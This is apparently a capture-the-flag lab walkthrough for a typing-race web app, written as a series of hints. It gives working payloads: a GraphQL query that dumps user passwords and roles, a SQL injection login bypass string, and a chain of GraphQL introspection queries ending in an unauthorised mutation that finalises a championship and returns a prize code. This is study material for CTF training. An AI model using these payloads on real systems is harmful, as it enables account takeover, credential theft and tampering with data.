* Hint : **GraphQL** - Lab variant: sokudo-005

  * /api/grpphql
  * Content-Type: application/json
```text
{"query":"{ __typename }"}
```
```text
{"query":"{ users { id username password role } }"}
```


* Hint : **Can you login as someone else?**

  * SQL Injection
    ```text
    admin' or 1=1 -- -
    ```
  * Flag in `/api/login`


* Hint : **Can you finalise the championship results?** : Lab variant: sokudo-006

  * In `/api/graphql` : follow these steps replace
    `
    {"query":"{\n  currentSeason {\n    id\n    name\n    status\n    standings { rank username wpm accuracy }\n  }\n}"}
    `
  * Step 1 :
    ```text
    {"query":"query{__schema{types{name}}}"}
    ```
  * Step 2 :
    ```text
    {"query":"query {__type(name:\"Mutation\") {fields { name args {name type {kind name ofType {kind name}}} type {kind name ofType {kind name}}}}}"}
    ```
  * Step 3 :
    ```text
    {"query":"query {__type(name: \"ChampionshipResult\") { fields {name type {kind name ofType {kind name}}}}} "}
    ```
  * Step 4 :
    ```text
    {"query": "mutation {finalizeChampionship(seasonId: \"1\") { seasonId champion finalized prizeCode}}"}
    ```
  
